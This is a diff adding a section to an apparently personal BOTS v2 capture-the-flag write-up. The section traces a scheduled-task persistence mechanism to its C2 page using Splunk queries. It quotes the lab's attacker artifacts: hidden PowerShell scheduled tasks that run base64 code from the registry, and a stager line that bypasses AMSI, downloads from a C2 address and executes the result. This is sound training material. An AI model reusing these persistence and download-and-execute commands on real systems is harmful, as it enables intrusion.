@@ -970,3 +970,98 @@ Just one email with kovar@yahoo.com.tw ryan appears part of name in 18 emails no
 		unzip invoice_decodedb64.zip
 ```
 Answer is found int invoice.doc: Congrats! It looks like you have a virustotal account and chose to live on the edge. If you find this… turn it in for some CyberEastEgg points!!! 
+
+
+**Q6 To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html**
+
+Starting with index=botsv2 *schtasks*
+
+To make it more viewable:
+
+```
+index=botsv2 schtasks.exe
+| table _time host user CommandLine ParentImage powershell
+```
+Three occur in time ranges expected 
+```
+2017-08-24 03:45:03	wrk-btun	FROTHLY\billy.tun	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 
+
+2017-08-24 03:45:03	wrk-btun	billy.tun	 	 	 
+
+2017-08-24 04:12:36	venus	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 
+
+2017-08-24 04:12:36	venus	service3	 	 	 
+
+2017-08-24 04:04:27	wrk-klagerf	 	 	 	 
+
+2017-08-24 04:04:26	wrk-klagerf	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+```
+Simplify with just *schtasks* and interesting fields commandline there are 10 those, all three admin.php is in first one. So sort of dead end.
+Its beaconing so try:
+```
+index=botsv2 45.77.65.211
+| top uri
+```
+Results were, no link if using *schtask* 
+```
+uri            count            percent
+/member.php	   594              12.237330
+/search.php	   164              3.378657
+/              43               0.885867
+/admin/        3                0.061805
+/~www-data/    2                0.041203
+/~debian-tor/  2                0.041203
+/~Debian-exim/ 2                0.041203
+/www/	       2                0.041203
+/www-data/     2                0.041203
+/wp-login.php  2                0.041203
+```
+Dropping the uri, jupitor, growler, gacrux, and venus seem to be most connections made to C2 IP.
+```
+only 5 hosts were connected to
+jupiter 	86,737 	51.625% 	
+growler 	48,397 	28.805% 	
+gacrux 	28,307 	16.848% 	
+venus 	4,572 	2.721% 	
+ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088 	1 	0%
+```
+Most connections appear to be from 2 familar IP seen before:
+```
+src_ip
+
+Events with this field
+Values         Count 	% 	 
+10.0.2.107     50,846 	32.104% 	
+10.0.2.109     33,489 	21.144% 	
+10.0.1.100     27,778 	17.539% 	
+10.0.1.101     27,457 	17.336% 	
+45.77.65.211   18,811 	11.877%
+```
+Combining:
+```
+index=botsv2 index=botsv2 45.77.65.211 uri
+| stats count by src_ip
+```
+Source likely still uses members.php as most common connection to same IP. Looks like members.php is the answer that makes sense, but the actual answer is process.php. It only appears in one event in base64 code. 
+Using (show zero results):
+```
+index=botsv2 process.php
+```
+It appears in a near identical payload to that shown earlier, only process.php is in it:
+```
+[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils....$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr $T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV $K))|IEX
+```
+This can be found is and starts after most earlier payloads delivered at 4:04:26
+```
+using "index=botsv2 HKLM\\software\\microsoft\\network" there are 4 results and 3rd one or second done the first was similar to admin/get.php earlier found not process.php 8/24/17
+4:04:26.000 AM	
+08/23/2017 21:04:26.827
+event_status="(0)The operation completed successfully."
+pid=2936
+process_image="c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+registry_type="SetValue"
+key_path="HKLM\software\microsoft\network\debug"
+data_type="REG_SZ"
+data="WwBSAEUARgBdAC4.....ADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABhAFQAQQA9ACQAVwBDAC4ARABvAHcATgBsAG8AQQBkAEQAQQBUAEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAQQAuAGwAZQBuAEcAVABIAF0AOwAtAGoATwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA" data section ends with the above address.
+```
+
